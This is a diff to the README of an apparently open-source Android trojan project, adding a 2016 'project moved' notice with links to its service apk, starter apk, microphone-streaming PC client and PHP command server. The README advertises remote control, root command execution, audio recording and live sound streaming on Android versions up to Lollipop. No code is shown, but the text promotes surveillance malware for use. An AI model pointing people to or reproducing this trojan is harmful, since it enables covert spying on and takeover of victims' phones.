@@ -1,4 +1,13 @@
 # Android Trojan (Built with Android SDK 22) source code
+UPD. 11.02.2016
+PROJECT MOVED! Version 1.2 released!
+HERE ARE LINKS TO ALL COMPONENTS:
+
+Actual trojan service apk: https://github.com/androidtrojan1/android-trojan-service-
+trojan starter apk: https://github.com/androidtrojan1/android-trojan-starter-
+mic streamer pc client: https://github.com/androidtrojan1/android-trojan-streamer
+trojan php server part: https://github.com/androidtrojan1/android-trojan-php-server
+
 Android trojan with abilities of remote control,root commands execution, recording and online sound streaming
 
 Compatible with all Android from Gingerbread (API 10) up to Lollipop (API 22)
